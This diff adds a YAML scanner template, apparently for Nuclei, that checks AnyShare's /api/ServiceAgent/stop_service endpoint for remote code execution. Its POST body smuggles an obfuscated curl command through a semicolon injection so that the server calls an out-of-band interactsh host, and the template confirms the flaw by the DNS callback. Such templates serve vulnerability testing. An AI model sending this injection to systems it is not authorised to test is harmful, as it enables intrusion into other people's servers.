@@ -1,0 +1,38 @@
+id: anyshare-stop-service-rce
+info:
+  name: AnyShare Stop Service Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+  description: |
+    Exploits a remote code execution vulnerability in the AnyShare intelligent content management platform via the stop_service API.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - "/api/ServiceAgent/stop_service"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      ["com;/u?r/b?n/c??l {{reverse}}"]
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "null"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
